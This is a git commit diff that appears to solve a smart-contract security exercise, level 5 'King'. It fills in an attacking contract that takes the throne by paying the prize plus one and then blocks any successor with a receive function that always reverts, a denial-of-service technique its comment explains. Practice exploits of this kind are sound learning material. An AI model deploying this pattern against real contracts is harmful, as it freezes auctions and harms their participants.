4623679b2951f2b2f0009c760096405aa54cb3bd
bluecco <bluecco@gmail.com>
2022-05-10 18:55:19 +0200

    level 5

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -10,7 +10,18 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    /* 
+    DoS with (Unexpected) revert 
+    If attacker bids using a smart contract which has a fallback function that reverts any payment, 
+    the attacker can win any auction.
+    */
+    receive() external payable {
+        revert("Bow to the king!");
+    }
+
     function hackContract() external {
-        // Code me!
+        uint256 prize = King(payable(contractAddress)).prize();
+        (bool success, ) = contractAddress.call{value: prize + 1}("");
+        require(success);
     }
 }
